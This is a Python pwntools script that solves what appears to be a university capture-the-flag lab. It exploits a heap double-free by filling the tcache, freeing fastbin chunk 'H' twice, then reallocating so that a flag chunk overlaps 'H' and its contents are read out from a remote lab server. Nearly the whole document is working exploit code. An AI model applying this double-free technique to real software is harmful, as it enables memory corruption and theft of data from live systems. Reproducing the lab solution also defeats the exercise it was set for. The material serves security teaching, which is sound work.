''' Script Module Importing '''
from pwn import *

''' Establish Connection '''
p = remote("csc748.hostbin.org", 7091)      # Test Script Against Server
# p = process("./9-1_lab.bin")              # Test Script Locally
# p = gdb.debug("./9-1_lab.bin")            # Debug with GDB


''' Initialize Globals '''
chunk_ids = {}
freed_chunks = set()


''' Define Functions '''
def allocate_chunk(chunk_name, content):

    ''' Allocate Chunk '''
    p.sendlineafter(b"Choice: ", b'1')          # Select Option (1) New to Allocate Chunk
    p.sendlineafter(b"Contents: ", content)     # Fill Chunk
    id_return = p.readuntil(b')')               # Read until the closing parenthesis

    ''' Set ID Number '''
    chunk_id = int(id_return
                   .split(b'#')[1]
                   .split(b')')[0])             # Extract ID number

    chunk_ids[chunk_name] = chunk_id            # Assign ID to Letter

    ''' Print Updates'''
    if chunk_name in freed_chunks:
        print(f"    [-] Chunk '{chunk_name}' Re-Allocated from"
              f"  {'TCache' if chunk_name <= 'G' else 'FastBin'}")
        freed_chunks.remove(chunk_name)
    else:
        print(f"    [-] {'TCache' if chunk_name <= 'G' else 'FastBin'} Chunk"
              f" '{chunk_name}' Allocated <ID #{chunk_ids[chunk_name]}>")


def free_chunk(chunk_name):
    ''' Free Chunk '''
    chunk_id = chunk_ids[chunk_name]
    p.sendlineafter(b"Choice: ", b'3')                  # Select Option (3) Delete
    p.sendlineafter(b"ID?: ", str(chunk_id).encode())   # Free Chunk

    ''' Print Updates'''
    print(f"    [-] '{chunk_name}' Freed <ID #{chunk_id}> to"
          f"  {'TCache' if chunk_name <= 'G' else 'FastBin'}")
    print("    [-] TCache Filled\n\n" if chunk_id == 6 else "", end='')
    
    if chunk_name in freed_chunks:
        print(f"    [!] Double-Free on Chunk '{chunk_name}' Successfully Executed")
    else:
        freed_chunks.add(chunk_name)


def obtain_flag(chunk_name):
    chunk_id = chunk_ids[chunk_name]
    
    p.sendlineafter(b"Choice: ", b'2')                  # Select Option (1) New
    p.sendlineafter(b"ID?: ", str(chunk_id).encode())   # Send Chunk ID
    p.recvuntil(b"Contents: ")                          # Discard Program Output
    
    flag = p.recvuntil(b"}").decode('utf-8')            # Extract Flag
    return flag


if __name__ == "__main__":

    ''' ' ' ' ' ' ' ' ' ' ' ' ' '''
    ''' Step 1: Allocate Chunks '''
    ''' ' ' ' ' ' ' ' ' ' ' ' ' '''
    print("\n[*] Allocating Chunks")

    for letter in 'ABCDEFG':
        allocate_chunk(letter, bytes(letter * 16, 'utf-8'))     # 'TCache' Chunks: A-G
    
    for letter in 'HI':
        allocate_chunk(letter, bytes(letter * 16, 'utf-8'))     # 'FastBin' Chunks: H-I


    ''' ' ' ' ' ' ' ' ' ' ' '''
    ''' Step 2: Free Chunks '''
    ''' ' ' ' ' ' ' ' ' ' ' '''
    print("\n[*] Freeing Chunks")
    
    for letter in 'ABCDEFG':
        free_chunk(letter)      # Release Chunks A-G to 'TCache'
    
    for letter in 'HI':
        free_chunk(letter)      # Release Chunks H-I to 'FastBin'
    
    free_chunk('H')             # Execute Double-Free on Chunks H


    ''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
    ''' Step 3:  Re-Allocate Chunks '''
    ''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
    print("\n[*] Re-Allocating Chunks")
    
    for letter in 'ABCDEFG':
        allocate_chunk(letter, bytes(letter * 16, 'utf-8'))     # 'TCache' Chunks: A-G
    
    for letter in 'HI':
        allocate_chunk(letter, bytes(letter * 16, 'utf-8'))     # 'FastBin' Chunks: H-I


    ''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
    ''' Step 4: Allocate Target Chunk '''
    ''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
    print("\n[*] Allocating Flag Chunk to Overwrite 'H'")
    p.sendlineafter(b"Choice: ", b'5')                          # Select Option (1) New
    print("    [!] Flag Loaded into Chunk 'H' Successfully")



    ''' ' ' ' ' ' ' ' ' ' ' ' '''
    ''' Step 5: Receive Flag  '''
    ''' ' ' ' ' ' ' ' ' ' ' ' '''
    print("\n[*] Reading Flag Chunk")
    flag = obtain_flag('H')
    print(f"    [!] Flag Successfully Obtained: {flag}\n")      # Print Flag
